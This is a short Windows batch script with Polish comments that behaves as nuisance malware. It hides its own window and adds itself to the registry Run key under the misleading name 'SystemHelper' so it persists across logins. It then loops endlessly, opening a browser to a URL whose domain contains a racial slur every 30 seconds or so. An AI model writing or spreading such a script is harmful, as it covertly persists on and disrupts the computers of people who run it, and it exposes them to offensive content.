@echo off
:: Ukrywa okno
if not "%1"=="h" (
    start /min cmd /c "%~f0" h
    exit
)

:: Dodaje wpis do rejestru, aby uruchamiał się przy starcie systemu
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHelper" /t REG_SZ /d "%~f0" /f

:: Zapętla i monitoruje uruchamianie plików
:loop
    tasklist /fo csv | findstr /i ".exe" > nul
    if %errorlevel% equ 0 (
        start "" "https://niggafart.com"
        timeout /t 30 /nobreak > nul
    )
    timeout /t 5 /nobreak > nul
goto loop
